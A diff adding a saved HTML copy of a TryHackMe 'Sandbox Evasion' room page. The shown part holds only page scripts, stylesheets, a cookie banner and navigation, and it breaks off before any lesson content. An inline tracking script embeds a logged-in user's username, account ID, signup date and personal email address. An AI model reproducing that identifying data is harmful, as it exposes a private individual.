@@ -1,0 +1,2945 @@
+<!DOCTYPE html>
+<!-- saved from url=(0041)https://tryhackme.com/room/sandboxevasion -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<title>TryHackMe | Sandbox Evasion</title>
+<meta name="description" content="Learn about active defense mechanisms Blue Teamers can deploy to identify adversaries in their environment.">
+<meta name="og:description" content="Learn about active defense mechanisms Blue Teamers can deploy to identify adversaries in their environment.">
+<meta name="keywords" content="cyber,security,cyber security,cyber security training,coding,computer,bitcoin,hacking,hackers,hacks,hack,exploits,keylogger,learn,poc">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+
+<meta property="og:site_name" content="TryHackMe">
+<meta property="og:title" content="TryHackMe | Sandbox Evasion">
+<meta property="og:image" content="https://tryhackme-images.s3.amazonaws.com/room-icons/9f8cb614a755dc01aa6d35dee528e3d2.png">
+<meta property="og:url" content="https://tryhackme.com/room/sandboxevasion">
+<meta name="twitter:image" content="https://tryhackme.com/img/meta/default.png">
+<meta property="og:description" content="Learn about active defense mechanisms Blue Teamers can deploy to identify adversaries in their environment.">
+
+<script type="text/javascript" async="" src="./TryHackMe _ Sandbox Evasion_files/pgpbhph6"></script><script src="./TryHackMe _ Sandbox Evasion_files/jquery.min.js"></script>
+<script src="./TryHackMe _ Sandbox Evasion_files/popper.min.js"></script>
+<link rel="stylesheet" href="./TryHackMe _ Sandbox Evasion_files/boostrap431.min.css">
+<script src="./TryHackMe _ Sandbox Evasion_files/bootstrap431.min.js"></script>
+<link rel="stylesheet" href="./TryHackMe _ Sandbox Evasion_files/animate.min.css">
+<link rel="stylesheet" href="./TryHackMe _ Sandbox Evasion_files/all.css" integrity="sha384-ekOryaXPbeCpWQNxMwSWVvQ0+1VrStoPJq54shlYhR8HzQgig1v5fas6YgOqLoKz" crossorigin="anonymous">
+<link rel="icon" type="image/png" href="https://assets.tryhackme.com/img/favicon.png">
+<link rel="stylesheet" media="screen" href="./TryHackMe _ Sandbox Evasion_files/general-style.css">
+<script src="./TryHackMe _ Sandbox Evasion_files/script.js"></script>
+<script src="./TryHackMe _ Sandbox Evasion_files/validation.js"></script>
+
+<link rel="stylesheet" type="text/css" href="./TryHackMe _ Sandbox Evasion_files/cookieconsent.min.css">
+<script src="./TryHackMe _ Sandbox Evasion_files/cookieconsent.min.js"></script>
+<script async="" src="./TryHackMe _ Sandbox Evasion_files/js"></script>
+<script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+  
+    gtag('config', 'G-Z8D4WL3D4P');
+  </script>
+
+
+<script>
+    window.intercomSettings = {
+      api_base: "https://api-iam.intercom.io",
+      app_id: "pgpbhph6"
+    };
+  </script>
+<script>
+    (function (h, o, t, j, a, r) {
+      h.hj = h.hj || function () { (h.hj.q = h.hj.q || []).push(arguments) };
+      h._hjSettings = { hjid: 1950941, hjsv: 6 };
+      a = o.getElementsByTagName('head')[0];
+      r = o.createElement('script'); r.async = 1;
+      r.src = t + h._hjSettings.hjid + j + h._hjSettings.hjsv;
+      a.appendChild(r);
+    })(window, document, 'https://static.hotjar.com/c/hotjar-', '.js?sv=');
+  </script><script async="" src="./TryHackMe _ Sandbox Evasion_files/hotjar-1950941.js"></script>
+<script>
+    /* Global javascript variables */
+
+    // Used inside script.js for createRooms compelted users.
+    const username = 'Silv3rsurf3r'
+    const subscribed = '1'
+    const level = '10'
+    const intercomEnabled = 'true'
+  </script>
+<script>
+    //add back tracking info
+    const userId = "63d14e7f857ae10041bb192f"
+    let tutorialComplete = false
+    if ('false' == "true") {
+      tutorialComplete = true
+    }
+    if(intercomEnabled === "true"){
+      window.intercomSettings = {
+        api_base: "https://api-iam.intercom.io",
+        app_id: "pgpbhph6",
+        user_id: userId,
+        username: username,
+        email: "giftonpaul@karunya.edu.in",
+        created_at: Math.floor(new Date("Wed Jan 25 2023 15:45:03 GMT+0000 (Greenwich Mean Time)").getTime() / 1000) // Signup date as a Unix timestamp
+      };
+    }
+    window.hj('identify', userId, {
+      displayName: username,
+      subscribed: "1",
+      dateSignUp: "Wed Jan 25 2023 15:45:03 GMT+0000 (Greenwich Mean Time)",
+      experience: "advanced"
+    })
+  </script>
+<script type="application/ld+json">
+
+   {
+      "@context":"https://schema.org",
+      "@type":"Organization",
+      "url":"https://tryhackme.com",
+      "name":"TryHackMe",
+      "logo":"https://tryhackme.com/img/favicon.png",
+      "description":"TryHackMe is a free online platform for learning cyber security, using hands-on exercises and labs, all through your browser!",
+      "email": "support@tryhackme.com",
+      "sameAs":[
+         "https://www.linkedin.com/company/tryhackme",
+         "https://twitter.com/realtryhackme"
+      ]
+   }
+
+</script>
+<script>
+    console.log(`%c
+      ------------------
+      < Happy Hacking! >
+      ------------------
+              \\   ^__^
+               \\  (oo)\\_______
+                  (__)\\       )\\/\\
+                      ||----w |
+                      ||     ||`, "font-family:monospace")
+  </script>
+<script>
+  (function(){var w=window;var ic=w.Intercom;if(typeof ic==="function"){ic('reattach_activator');ic('update',w.intercomSettings);}else{var d=document;var i=function(){i.c(arguments);};i.q=[];i.c=function(args){i.q.push(args);};w.Intercom=i;var l=function(){var s=d.createElement('script');s.type='text/javascript';s.async=true;s.src='https://widget.intercom.io/widget/pgpbhph6';var x=d.getElementsByTagName('script')[0];x.parentNode.insertBefore(s,x);};if(document.readyState==='complete'){l();}else if(w.attachEvent){w.attachEvent('onload',l);}else{w.addEventListener('load',l,false);}}})();
+</script>
+<script src="./TryHackMe _ Sandbox Evasion_files/socket.io.js"></script><script>
+  let socket = io.connect({
+    transports: ['websocket'],
+    reconnection: true,
+    reconnectionDelay: 1000,
+    reconnectionAttempts: 10
+  })
+</script><script async="" src="./TryHackMe _ Sandbox Evasion_files/modules.5957fbf26d1b525b5a12.js" charset="utf-8"></script><style type="text/css">.apexcharts-canvas {
+  position: relative;
+  user-select: none;
+  /* cannot give overflow: hidden as it will crop tooltips which overflow outside chart area */
+}
+
+
+/* scrollbar is not visible by default for legend, hence forcing the visibility */
+.apexcharts-canvas ::-webkit-scrollbar {
+  -webkit-appearance: none;
+  width: 6px;
+}
+
+.apexcharts-canvas ::-webkit-scrollbar-thumb {
+  border-radius: 4px;
+  background-color: rgba(0, 0, 0, .5);
+  box-shadow: 0 0 1px rgba(255, 255, 255, .5);
+  -webkit-box-shadow: 0 0 1px rgba(255, 255, 255, .5);
+}
+
+
+.apexcharts-inner {
+  position: relative;
+}
+
+.apexcharts-text tspan {
+  font-family: inherit;
+}
+
+.legend-mouseover-inactive {
+  transition: 0.15s ease all;
+  opacity: 0.20;
+}
+
+.apexcharts-series-collapsed {
+  opacity: 0;
+}
+
+.apexcharts-tooltip {
+  border-radius: 5px;
+  box-shadow: 2px 2px 6px -4px #999;
+  cursor: default;
+  font-size: 14px;
+  left: 62px;
+  opacity: 0;
+  pointer-events: none;
+  position: absolute;
+  top: 20px;
+  display: flex;
+  flex-direction: column;
+  overflow: hidden;
+  white-space: nowrap;
+  z-index: 12;
+  transition: 0.15s ease all;
+}
+
+.apexcharts-tooltip.apexcharts-active {
+  opacity: 1;
+  transition: 0.15s ease all;
+}
+
+.apexcharts-tooltip.apexcharts-theme-light {
+  border: 1px solid #e3e3e3;
+  background: rgba(255, 255, 255, 0.96);
+}
+
+.apexcharts-tooltip.apexcharts-theme-dark {
+  color: #fff;
+  background: rgba(30, 30, 30, 0.8);
+}
+
+.apexcharts-tooltip * {
+  font-family: inherit;
+}
+
+
+.apexcharts-tooltip-title {
+  padding: 6px;
+  font-size: 15px;
+  margin-bottom: 4px;
+}
+
+.apexcharts-tooltip.apexcharts-theme-light .apexcharts-tooltip-title {
+  background: #ECEFF1;
+  border-bottom: 1px solid #ddd;
+}
+
+.apexcharts-tooltip.apexcharts-theme-dark .apexcharts-tooltip-title {
+  background: rgba(0, 0, 0, 0.7);
+  border-bottom: 1px solid #333;
+}
+
+.apexcharts-tooltip-text-y-value,
+.apexcharts-tooltip-text-goals-value,
+.apexcharts-tooltip-text-z-value {
+  display: inline-block;
+  font-weight: 600;
+  margin-left: 5px;
+}
+
+.apexcharts-tooltip-text-y-label:empty,
+.apexcharts-tooltip-text-y-value:empty,
+.apexcharts-tooltip-text-goals-label:empty,
+.apexcharts-tooltip-text-goals-value:empty,
+.apexcharts-tooltip-text-z-value:empty {
+  display: none;
+}
+
+.apexcharts-tooltip-text-y-value,
+.apexcharts-tooltip-text-goals-value,
+.apexcharts-tooltip-text-z-value {
+  font-weight: 600;
+}
+
+.apexcharts-tooltip-text-goals-label, 
+.apexcharts-tooltip-text-goals-value {
+  padding: 6px 0 5px;
+}
+
+.apexcharts-tooltip-goals-group, 
+.apexcharts-tooltip-text-goals-label, 
+.apexcharts-tooltip-text-goals-value {
+  display: flex;
+}
+.apexcharts-tooltip-text-goals-label:not(:empty),
+.apexcharts-tooltip-text-goals-value:not(:empty) {
+  margin-top: -6px;
+}
+
+.apexcharts-tooltip-marker {
+  width: 12px;
+  height: 12px;
+  position: relative;
+  top: 0px;
+  margin-right: 10px;
+  border-radius: 50%;
+}
+
+.apexcharts-tooltip-series-group {
+  padding: 0 10px;
+  display: none;
+  text-align: left;
+  justify-content: left;
+  align-items: center;
+}
+
+.apexcharts-tooltip-series-group.apexcharts-active .apexcharts-tooltip-marker {
+  opacity: 1;
+}
+
+.apexcharts-tooltip-series-group.apexcharts-active,
+.apexcharts-tooltip-series-group:last-child {
+  padding-bottom: 4px;
+}
+
+.apexcharts-tooltip-series-group-hidden {
+  opacity: 0;
+  height: 0;
+  line-height: 0;
+  padding: 0 !important;
+}
+
+.apexcharts-tooltip-y-group {
+  padding: 6px 0 5px;
+}
+
+.apexcharts-tooltip-box, .apexcharts-custom-tooltip {
+  padding: 4px 8px;
+}
+
+.apexcharts-tooltip-boxPlot {
+  display: flex;
+  flex-direction: column-reverse;
+}
+
+.apexcharts-tooltip-box>div {
+  margin: 4px 0;
+}
+
+.apexcharts-tooltip-box span.value {
+  font-weight: bold;
+}
+
+.apexcharts-tooltip-rangebar {
+  padding: 5px 8px;
+}
+
+.apexcharts-tooltip-rangebar .category {
+  font-weight: 600;
+  color: #777;
+}
+
+.apexcharts-tooltip-rangebar .series-name {
+  font-weight: bold;
+  display: block;
+  margin-bottom: 5px;
+}
+
+.apexcharts-xaxistooltip {
+  opacity: 0;
+  padding: 9px 10px;
+  pointer-events: none;
+  color: #373d3f;
+  font-size: 13px;
+  text-align: center;
+  border-radius: 2px;
+  position: absolute;
+  z-index: 10;
+  background: #ECEFF1;
+  border: 1px solid #90A4AE;
+  transition: 0.15s ease all;
+}
+
+.apexcharts-xaxistooltip.apexcharts-theme-dark {
+  background: rgba(0, 0, 0, 0.7);
+  border: 1px solid rgba(0, 0, 0, 0.5);
+  color: #fff;
+}
+
+.apexcharts-xaxistooltip:after,
+.apexcharts-xaxistooltip:before {
+  left: 50%;
+  border: solid transparent;
+  content: " ";
+  height: 0;
+  width: 0;
+  position: absolute;
+  pointer-events: none;
+}
+
+.apexcharts-xaxistooltip:after {
+  border-color: rgba(236, 239, 241, 0);
+  border-width: 6px;
+  margin-left: -6px;
+}
+
+.apexcharts-xaxistooltip:before {
+  border-color: rgba(144, 164, 174, 0);
+  border-width: 7px;
+  margin-left: -7px;
+}
+
+.apexcharts-xaxistooltip-bottom:after,
+.apexcharts-xaxistooltip-bottom:before {
+  bottom: 100%;
+}
+
+.apexcharts-xaxistooltip-top:after,
+.apexcharts-xaxistooltip-top:before {
+  top: 100%;
+}
+
+.apexcharts-xaxistooltip-bottom:after {
+  border-bottom-color: #ECEFF1;
+}
+
+.apexcharts-xaxistooltip-bottom:before {
+  border-bottom-color: #90A4AE;
+}
+
+.apexcharts-xaxistooltip-bottom.apexcharts-theme-dark:after {
+  border-bottom-color: rgba(0, 0, 0, 0.5);
+}
+
+.apexcharts-xaxistooltip-bottom.apexcharts-theme-dark:before {
+  border-bottom-color: rgba(0, 0, 0, 0.5);
+}
+
+.apexcharts-xaxistooltip-top:after {
+  border-top-color: #ECEFF1
+}
+
+.apexcharts-xaxistooltip-top:before {
+  border-top-color: #90A4AE;
+}
+
+.apexcharts-xaxistooltip-top.apexcharts-theme-dark:after {
+  border-top-color: rgba(0, 0, 0, 0.5);
+}
+
+.apexcharts-xaxistooltip-top.apexcharts-theme-dark:before {
+  border-top-color: rgba(0, 0, 0, 0.5);
+}
+
+.apexcharts-xaxistooltip.apexcharts-active {
+  opacity: 1;
+  transition: 0.15s ease all;
+}
+
+.apexcharts-yaxistooltip {
+  opacity: 0;
+  padding: 4px 10px;
+  pointer-events: none;
+  color: #373d3f;
+  font-size: 13px;
+  text-align: center;
+  border-radius: 2px;
+  position: absolute;
+  z-index: 10;
+  background: #ECEFF1;
+  border: 1px solid #90A4AE;
+}
+
+.apexcharts-yaxistooltip.apexcharts-theme-dark {
+  background: rgba(0, 0, 0, 0.7);
+  border: 1px solid rgba(0, 0, 0, 0.5);
+  color: #fff;
+}
+
+.apexcharts-yaxistooltip:after,
+.apexcharts-yaxistooltip:before {
+  top: 50%;
+  border: solid transparent;
+  content: " ";
+  height: 0;
+  width: 0;
+  position: absolute;
+  pointer-events: none;
+}
+
+.apexcharts-yaxistooltip:after {
+  border-color: rgba(236, 239, 241, 0);
+  border-width: 6px;
+  margin-top: -6px;
+}
+
+.apexcharts-yaxistooltip:before {
+  border-color: rgba(144, 164, 174, 0);
+  border-width: 7px;
+  margin-top: -7px;
+}
+
+.apexcharts-yaxistooltip-left:after,
+.apexcharts-yaxistooltip-left:before {
+  left: 100%;
+}
+
+.apexcharts-yaxistooltip-right:after,
+.apexcharts-yaxistooltip-right:before {
+  right: 100%;
+}
+
+.apexcharts-yaxistooltip-left:after {
+  border-left-color: #ECEFF1;
+}
+
+.apexcharts-yaxistooltip-left:before {
+  border-left-color: #90A4AE;
+}
+
+.apexcharts-yaxistooltip-left.apexcharts-theme-dark:after {
+  border-left-color: rgba(0, 0, 0, 0.5);
+}
+
+.apexcharts-yaxistooltip-left.apexcharts-theme-dark:before {
+  border-left-color: rgba(0, 0, 0, 0.5);
+}
+
+.apexcharts-yaxistooltip-right:after {
+  border-right-color: #ECEFF1;
+}
+
+.apexcharts-yaxistooltip-right:before {
+  border-right-color: #90A4AE;
+}
+
+.apexcharts-yaxistooltip-right.apexcharts-theme-dark:after {
+  border-right-color: rgba(0, 0, 0, 0.5);
+}
+
+.apexcharts-yaxistooltip-right.apexcharts-theme-dark:before {
+  border-right-color: rgba(0, 0, 0, 0.5);
+}
+
+.apexcharts-yaxistooltip.apexcharts-active {
+  opacity: 1;
+}
+
+.apexcharts-yaxistooltip-hidden {
+  display: none;
+}
+
+.apexcharts-xcrosshairs,
+.apexcharts-ycrosshairs {
+  pointer-events: none;
+  opacity: 0;
+  transition: 0.15s ease all;
+}
+
+.apexcharts-xcrosshairs.apexcharts-active,
+.apexcharts-ycrosshairs.apexcharts-active {
+  opacity: 1;
+  transition: 0.15s ease all;
+}
+
+.apexcharts-ycrosshairs-hidden {
+  opacity: 0;
+}
+
+.apexcharts-selection-rect {
+  cursor: move;
+}
+
+.svg_select_boundingRect, .svg_select_points_rot {
+  pointer-events: none;
+  opacity: 0;
+  visibility: hidden;
+}
+.apexcharts-selection-rect + g .svg_select_boundingRect,
+.apexcharts-selection-rect + g .svg_select_points_rot {
+  opacity: 0;
+  visibility: hidden;
+}
+
+.apexcharts-selection-rect + g .svg_select_points_l,
+.apexcharts-selection-rect + g .svg_select_points_r {
+  cursor: ew-resize;
+  opacity: 1;
+  visibility: visible;
+}
+
+.svg_select_points {
+  fill: #efefef;
+  stroke: #333;
+  rx: 2;
+}
+
+.apexcharts-svg.apexcharts-zoomable.hovering-zoom {
+  cursor: crosshair
+}
+
+.apexcharts-svg.apexcharts-zoomable.hovering-pan {
+  cursor: move
+}
+
+.apexcharts-zoom-icon,
+.apexcharts-zoomin-icon,
+.apexcharts-zoomout-icon,
+.apexcharts-reset-icon,
+.apexcharts-pan-icon,
+.apexcharts-selection-icon,
+.apexcharts-menu-icon,
+.apexcharts-toolbar-custom-icon {
+  cursor: pointer;
+  width: 20px;
+  height: 20px;
+  line-height: 24px;
+  color: #6E8192;
+  text-align: center;
+}
+
+.apexcharts-zoom-icon svg,
+.apexcharts-zoomin-icon svg,
+.apexcharts-zoomout-icon svg,
+.apexcharts-reset-icon svg,
+.apexcharts-menu-icon svg {
+  fill: #6E8192;
+}
+
+.apexcharts-selection-icon svg {
+  fill: #444;
+  transform: scale(0.76)
+}
+
+.apexcharts-theme-dark .apexcharts-zoom-icon svg,
+.apexcharts-theme-dark .apexcharts-zoomin-icon svg,
+.apexcharts-theme-dark .apexcharts-zoomout-icon svg,
+.apexcharts-theme-dark .apexcharts-reset-icon svg,
+.apexcharts-theme-dark .apexcharts-pan-icon svg,
+.apexcharts-theme-dark .apexcharts-selection-icon svg,
+.apexcharts-theme-dark .apexcharts-menu-icon svg,
+.apexcharts-theme-dark .apexcharts-toolbar-custom-icon svg {
+  fill: #f3f4f5;
+}
+
+.apexcharts-canvas .apexcharts-zoom-icon.apexcharts-selected svg,
+.apexcharts-canvas .apexcharts-selection-icon.apexcharts-selected svg,
+.apexcharts-canvas .apexcharts-reset-zoom-icon.apexcharts-selected svg {
+  fill: #008FFB;
+}
+
+.apexcharts-theme-light .apexcharts-selection-icon:not(.apexcharts-selected):hover svg,
+.apexcharts-theme-light .apexcharts-zoom-icon:not(.apexcharts-selected):hover svg,
+.apexcharts-theme-light .apexcharts-zoomin-icon:hover svg,
+.apexcharts-theme-light .apexcharts-zoomout-icon:hover svg,
+.apexcharts-theme-light .apexcharts-reset-icon:hover svg,
+.apexcharts-theme-light .apexcharts-menu-icon:hover svg {
+  fill: #333;
+}
+
+.apexcharts-selection-icon,
+.apexcharts-menu-icon {
+  position: relative;
+}
+
+.apexcharts-reset-icon {
+  margin-left: 5px;
+}
+
+.apexcharts-zoom-icon,
+.apexcharts-reset-icon,
+.apexcharts-menu-icon {
+  transform: scale(0.85);
+}
+
+.apexcharts-zoomin-icon,
+.apexcharts-zoomout-icon {
+  transform: scale(0.7)
+}
+
+.apexcharts-zoomout-icon {
+  margin-right: 3px;
+}
+
+.apexcharts-pan-icon {
+  transform: scale(0.62);
+  position: relative;
+  left: 1px;
+  top: 0px;
+}
+
+.apexcharts-pan-icon svg {
+  fill: #fff;
+  stroke: #6E8192;
+  stroke-width: 2;
+}
+
+.apexcharts-pan-icon.apexcharts-selected svg {
+  stroke: #008FFB;
+}
+
+.apexcharts-pan-icon:not(.apexcharts-selected):hover svg {
+  stroke: #333;
+}
+
+.apexcharts-toolbar {
+  position: absolute;
+  z-index: 11;
+  max-width: 176px;
+  text-align: right;
+  border-radius: 3px;
+  padding: 0px 6px 2px 6px;
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+}
+
+.apexcharts-menu {
+  background: #fff;
+  position: absolute;
+  top: 100%;
+  border: 1px solid #ddd;
+  border-radius: 3px;
+  padding: 3px;
+  right: 10px;
+  opacity: 0;
+  min-width: 110px;
+  transition: 0.15s ease all;
+  pointer-events: none;
+}
+
+.apexcharts-menu.apexcharts-menu-open {
+  opacity: 1;
+  pointer-events: all;
+  transition: 0.15s ease all;
+}
+
+.apexcharts-menu-item {
+  padding: 6px 7px;
+  font-size: 12px;
+  cursor: pointer;
+}
+
+.apexcharts-theme-light .apexcharts-menu-item:hover {
+  background: #eee;
+}
+
+.apexcharts-theme-dark .apexcharts-menu {
+  background: rgba(0, 0, 0, 0.7);
+  color: #fff;
+}
+
+@media screen and (min-width: 768px) {
+  .apexcharts-canvas:hover .apexcharts-toolbar {
+    opacity: 1;
+  }
+}
+
+.apexcharts-datalabel.apexcharts-element-hidden {
+  opacity: 0;
+}
+
+.apexcharts-pie-label,
+.apexcharts-datalabels,
+.apexcharts-datalabel,
+.apexcharts-datalabel-label,
+.apexcharts-datalabel-value {
+  cursor: default;
+  pointer-events: none;
+}
+
+.apexcharts-pie-label-delay {
+  opacity: 0;
+  animation-name: opaque;
+  animation-duration: 0.3s;
+  animation-fill-mode: forwards;
+  animation-timing-function: ease;
+}
+
+.apexcharts-canvas .apexcharts-element-hidden {
+  opacity: 0;
+}
+
+.apexcharts-hide .apexcharts-series-points {
+  opacity: 0;
+}
+
+.apexcharts-gridline,
+.apexcharts-annotation-rect,
+.apexcharts-tooltip .apexcharts-marker,
+.apexcharts-area-series .apexcharts-area,
+.apexcharts-line,
+.apexcharts-zoom-rect,
+.apexcharts-toolbar svg,
+.apexcharts-area-series .apexcharts-series-markers .apexcharts-marker.no-pointer-events,
+.apexcharts-line-series .apexcharts-series-markers .apexcharts-marker.no-pointer-events,
+.apexcharts-radar-series path,
+.apexcharts-radar-series polygon {
+  pointer-events: none;
+}
+
+
+/* markers */
+
+.apexcharts-marker {
+  transition: 0.15s ease all;
+}
+
+@keyframes opaque {
+  0% {
+    opacity: 0;
+  }
+  100% {
+    opacity: 1;
+  }
+}
+
+
+/* Resize generated styles */
+
+@keyframes resizeanim {
+  from {
+    opacity: 0;
+  }
+  to {
+    opacity: 0;
+  }
+}
+
+.resize-triggers {
+  animation: 1ms resizeanim;
+  visibility: hidden;
+  opacity: 0;
+}
+
+.resize-triggers,
+.resize-triggers>div,
+.contract-trigger:before {
+  content: " ";
+  display: block;
+  position: absolute;
+  top: 0;
+  left: 0;
+  height: 100%;
+  width: 100%;
+  overflow: hidden;
+}
+
+.resize-triggers>div {
+  background: #eee;
+  overflow: auto;
+}
+
+.contract-trigger:before {
+  width: 200%;
+  height: 200%;
+}</style><style data-jss="" data-meta="MuiDialog">
+@media print {
+  .MuiDialog-root {
+    position: absolute !important;
+  }
+}
+.MuiDialog-scrollPaper {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+.MuiDialog-scrollBody {
+  overflow-x: hidden;
+  overflow-y: auto;
+  text-align: center;
+}
+.MuiDialog-scrollBody:after {
+  width: 0;
+  height: 100%;
+  content: "";
+  display: inline-block;
+  vertical-align: middle;
+}
+.MuiDialog-container {
+  height: 100%;
+  outline: 0;
+}
+@media print {
+  .MuiDialog-container {
+    height: auto;
+  }
+}
+.MuiDialog-paper {
+  margin: 32px;
+  position: relative;
+  overflow-y: auto;
+}
+@media print {
+  .MuiDialog-paper {
+    box-shadow: none;
+    overflow-y: visible;
+  }
+}
+.MuiDialog-paperScrollPaper {
+  display: flex;
+  max-height: calc(100% - 64px);
+  flex-direction: column;
+}
+.MuiDialog-paperScrollBody {
+  display: inline-block;
+  text-align: left;
+  vertical-align: middle;
+}
+.MuiDialog-paperWidthFalse {
+  max-width: calc(100% - 64px);
+}
+.MuiDialog-paperWidthXs {
+  max-width: 444px;
+}
+@media (max-width:507.95px) {
+  .MuiDialog-paperWidthXs.MuiDialog-paperScrollBody {
+    max-width: calc(100% - 64px);
+  }
+}
+.MuiDialog-paperWidthSm {
+  max-width: 600px;
+}
+@media (max-width:663.95px) {
+  .MuiDialog-paperWidthSm.MuiDialog-paperScrollBody {
+    max-width: calc(100% - 64px);
+  }
+}
+.MuiDialog-paperWidthMd {
+  max-width: 960px;
+}
+@media (max-width:1023.95px) {
+  .MuiDialog-paperWidthMd.MuiDialog-paperScrollBody {
+    max-width: calc(100% - 64px);
+  }
+}
+.MuiDialog-paperWidthLg {
+  max-width: 1280px;
+}
+@media (max-width:1343.95px) {
+  .MuiDialog-paperWidthLg.MuiDialog-paperScrollBody {
+    max-width: calc(100% - 64px);
+  }
+}
+.MuiDialog-paperWidthXl {
+  max-width: 1920px;
+}
+@media (max-width:1983.95px) {
+  .MuiDialog-paperWidthXl.MuiDialog-paperScrollBody {
+    max-width: calc(100% - 64px);
+  }
+}
+.MuiDialog-paperFullWidth {
+  width: calc(100% - 64px);
+}
+.MuiDialog-paperFullScreen {
+  width: 100%;
+  height: 100%;
+  margin: 0;
+  max-width: 100%;
+  max-height: none;
+  border-radius: 0;
+}
+.MuiDialog-paperFullScreen.MuiDialog-paperScrollBody {
+  margin: 0;
+  max-width: 100%;
+}
+</style><style></style></head>
+
+
+<body><div role="dialog" aria-live="polite" aria-label="cookieconsent" aria-describedby="cookieconsent:desc" class="cc-window cc-floating cc-type-info cc-theme-classic cc-bottom cc-right cc-color-override-382972913 cc-invisible" style="display: none;"><!--googleoff: all--><span id="cookieconsent:desc" class="cc-message">We use cookies to ensure you get the best user experience. For more information contact us. <a aria-label="learn more about cookies" role="button" tabindex="0" class="cc-link" href="https://tryhackme.com/legal/terms-of-use" target="_blank">Read more</a></span><div class="cc-compliance"><a aria-label="dismiss cookie message" role="button" tabindex="0" class="cc-btn cc-dismiss">Got it!</a></div><!--googleon: all--></div>
+<link href="./TryHackMe _ Sandbox Evasion_files/scoreboard.css" rel="stylesheet" type="text/css">
+<link href="./TryHackMe _ Sandbox Evasion_files/introjs.css" rel="stylesheet" type="text/css">
+<link href="./TryHackMe _ Sandbox Evasion_files/slideout.css" rel="stylesheet" type="text/css">
+<link href="./TryHackMe _ Sandbox Evasion_files/public-rooms.css" rel="stylesheet" type="text/css">
+<link href="./TryHackMe _ Sandbox Evasion_files/asciinema-player.css" rel="stylesheet" type="text/css"> 
+<link href="./TryHackMe _ Sandbox Evasion_files/prism.css" rel="stylesheet" type="text/css"> 
+<link href="./TryHackMe _ Sandbox Evasion_files/magnific-popup.css" rel="stylesheet" type="text/css"> 
+<script src="./TryHackMe _ Sandbox Evasion_files/lottie-player.js"></script>
+
+<div id="room-content">
+<div id="room-content-main">
+<nav class="navbar navbar-expand-md navbar-dark navbar-color-loggedin navbar-main">
+<div class="container">
+<button id="thm-mobile-nav-open" class="thm-nav__hamburger-btn" data-target="#thm-mobile-nav-menu" aria-controls="thm-mobile-nav-menu" aria-expanded="false" aria-label="Open mobile navigation">
+<span class="thm-nav__hamburger-lines"></span>
+</button>
+<div class="collapse navbar-collapse justify-content-end" id="navbarSupportedContent">
+<div class="navbar-brand" href="/">
+<a href="https://tryhackme.com/dashboard">
+<img width="115px" src="./TryHackMe _ Sandbox Evasion_files/tryhackme_logo_full.svg" alt="TryHackMe" class="logo">
+</a>
+</div>
+<ul class="navbar-nav mr-auto mt-2 mt-lg-0 navbar-pagelinks">
+<li class="nav-item ">
+<a class="nav-link" href="https://tryhackme.com/dashboard">
+<i class="navbar-item-icon far fa-browser"></i>
+<div class="navbar-item-text">Dashboard</div>
+</a>
+</li>
+<li class="nav-item active" id="nav-learn">
+<a class="nav-link" href="https://tryhackme.com/hacktivities">
+<i class="navbar-item-icon far fa-book-open"></i>
+<div class="navbar-item-text">Learn</div>
+</a>
+</li>
+<li class="nav-item  dropdown lite-removable">
+<a id="nav-other" class="nav-link" href="https://tryhackme.com/room/sandboxevasion#" data-toggle="dropdown">
+<i class="navbar-item-icon far fa-trophy"></i>
+<div class="navbar-item-text">Compete</div>
+</a>
+<div class="dropdown-menu" aria-labelledby="navbarDropdown">
+<a class="dropdown-item d-flex vertical-align-custom" href="https://tryhackme.com/leaderboards">
+<div class="dropdown-menu-icon">
+<i class="fas fa-trophy"></i>
+</div>
+<div class="dropdown-menu-desc">
+<span class="mb-0">Leaderboards</span>
+<div class="text-lgray size-12">Platform Rankings</div>
+</div>
+</a>
+<a class="dropdown-item d-flex vertical-align-custom" href="https://tryhackme.com/games/koth">
+<div class="dropdown-menu-icon">
+<i class="fas fa-crown"></i>
+</div>
+<div class="dropdown-menu-desc">
+<span class="mb-0">King of the Hill</span>
+<div class="text-lgray size-12">Attack &amp; Defend</div>
+</div>
+</a>
+<a class="dropdown-item d-flex vertical-align-custom" href="https://tryhackme.com/workspace">
+<div class="dropdown-menu-icon">
+<i class="fas fa-user-friends"></i>
+</div>
+<div class="dropdown-menu-desc">
+<span class="mb-0">Workspace</span>
+<div class="text-lgray size-12">Compete &amp; Collaborate</div>
+</div>
+</a>
+</div>
+</li>
+<li class="nav-item dropdown">
+<a data-cy="nav-other-menu-button" id="nav-other" class="nav-link" href="https://tryhackme.com/room/sandboxevasion#" data-toggle="dropdown">
+<i class="navbar-item-icon far fa-ellipsis-h-alt"></i>
+<div class="navbar-item-text">Other</div>
+</a>
+<div data-cy="nav-other-menu" class="dropdown-menu dropdown-menu-center large-dropdown" aria-labelledby="navbarDropdown">
+<span class="dropdown-menu-arrow"></span>
+<a class="dropdown-item" href="https://tryhackme.com/resources">Resources</a>
+<a class="dropdown-item" href="https://tryhackme.com/subscriptions">Buy Vouchers</a>
+<a class="dropdown-item" href="https://tryhackme.com/develop-rooms">Develop Rooms</a>
+<a class="dropdown-item" href="https://tryhackme.com/business">For Business</a>
+<a class="dropdown-item" href="https://tryhackme.com/classrooms">For Education</a>
+<a class="dropdown-item" target="_blank" href="https://store.tryhackme.com/">Swag Shop</a>
+<a class="dropdown-item" href="https://tryhackme.com/glossary">Glossary</a>
+</div>
+</li>
+</ul>
+<ul class="navbar-nav navbar-right options vertical-align-custom">
+<li class="nav-item" data-toggle="modal" data-target="#navConnModal">
+<div id="thm-connection-status" class="thm-disconnected" style="display: flex;">
+<div id="thm-connection-status-dot" class="dot-small"></div> <span id="thm-connection-status-txt" class="ml-2 size-18 text-white">Access Machines</span>
+</div>
+</li>
+<li class="nav-item">
+<div class="nav-item-streak">
+<span id="streak-popover" class="size-24" data-container="body" data-trigger="hover" data-toggle="popover" data-html="true" data-placement="bottom" data-content="&lt;p class=&#39;mb-2&#39;&gt;Complete a question every day to build your hacking streak, earn badges and streak freezes!&lt;/p&gt;
+
+&lt;div class=&#39;size-12 faded&#39;&gt;
+  &lt;p class=&#39;streak-points&#39;&gt;&lt;span class=&#39;streak-count&#39;&gt;7&lt;/span&gt; &lt;i class=&#39;fas fa-fire-alt hacker-green&#39;&gt;&lt;/i&gt; = Badge,
